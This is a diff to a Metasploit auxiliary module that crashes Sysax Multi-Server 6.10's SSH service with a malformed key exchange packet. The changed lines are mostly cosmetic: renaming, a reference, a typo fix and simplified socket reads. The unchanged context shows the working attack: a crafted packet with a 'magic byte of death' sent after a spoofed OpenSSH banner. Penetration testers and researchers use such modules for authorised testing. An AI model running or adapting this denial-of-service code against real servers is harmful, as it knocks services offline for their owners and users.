@@ -16,17 +16,17 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'Sysax Multi-Server 6.10 SSHD Key Exchange DoS',
+			'Name'           => 'Sysax Multi-Server 6.10 SSHD Key Exchange Denial of Service',
 			'Description'    => %q{
-				This module sends a specially-crafted SSH Key Exchange causing the
-				service to crash.
+					This module sends a specially-crafted SSH Key Exchange causing the service to
+				crash.
 			},
 			'Author'         => 'Matt "hostess" Andreko <mandreko[at]accuvant.com>',
 			'License'        => MSF_LICENSE,
 			'References'     =>
 				[
-					[ 'URL', 'http://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html'],
-
+					[ 'OSVDB', '92081'],
+					[ 'URL', 'http://www.mattandreko.com/2013/04/sysax-multi-server-610-ssh-dos.html']
 				],
 			'DisclosureDate' => 'Mar 17 2013'))
 
@@ -58,7 +58,7 @@ class Metasploit3 < Msf::Auxiliary
 		packet << Rex::Text.rand_text_alphanumeric(106)
 		packet << delimiter
 		packet << "\x28" # Magic byte of death - seems to work with just about
-						# anything except \x1a, the value it's suppposed to be
+						# anything except \x1a, the value it's supposed to be
 		packet << Rex::Text.rand_text_alphanumeric(26)
 		packet << delimiter
 		packet << Rex::Text.rand_text_alphanumeric(27)
@@ -69,13 +69,13 @@ class Metasploit3 < Msf::Auxiliary
 
 		connect
 
-		banner = sock.get_once(-1, 10) || ''
+		banner = sock.get_once || ''
 		print_status("Banner: #{banner.strip}")
 		sock.put("SSH-2.0-OpenSSH_5.1p1 " + datastore['CLIENTVERSION'] + "\r\n" + get_packet())
 
 		# Sometimes the socket closes faster than it can read, sometimes it doesn't, so catch the error just in case.
 		begin
-			sock.get_once(-1, 10)
+			sock.get_once
 		rescue Errno::ECONNRESET
 		end
 
